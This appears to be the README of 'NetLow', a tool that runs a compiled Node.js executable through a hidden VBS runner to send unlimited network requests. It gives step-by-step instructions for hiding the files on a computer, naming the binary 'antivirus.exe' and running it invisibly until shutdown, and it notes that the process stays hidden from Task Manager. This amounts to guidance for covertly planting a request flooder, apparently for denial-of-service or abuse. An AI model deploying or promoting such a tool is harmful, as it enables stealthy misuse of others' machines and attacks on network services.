How to use NetLow?
1.Install & Learn how to convert a js file to exe using pkg. https://npmjs.com/package/pkg
2.Compile index.js to an exe file.
3.copy & paste the compiled index.js & runner.vbs somewhere on the computer(Basicly hiding the file).
4.Once the 2 files are hidden open runner.vbs.
5.Change the netlow_file_path with the compiled index.js path and change "requestpersecondshere" to request per seconds.
Example:
CreateObject("Wscript.Shell").Run "antivirus.exe 500", 0 - This will request 500 request on initiate and approximately 3k+ requests per minute.

6.Then your done! Just run the runner.vbs

You said NetLow is Hidden?
Yes It's hidden in Task Manager not the file(You need to hide it manually) but If someone is expert in computer(That checks the computer security sometimes) then they would now instantly that someone is running a file hiddenly. 

Does NetLow have a limit in requesting?
No.

Does NetLow run forever?
Yes, unlesss the computer is shutdowned.

Does NetLow auto run on startup?
No.

How many request can you request using NetLow?
Depends on the "Request per seconds" argument you used. If you use 1000 that would be approximately 500-50000 requests per minute.
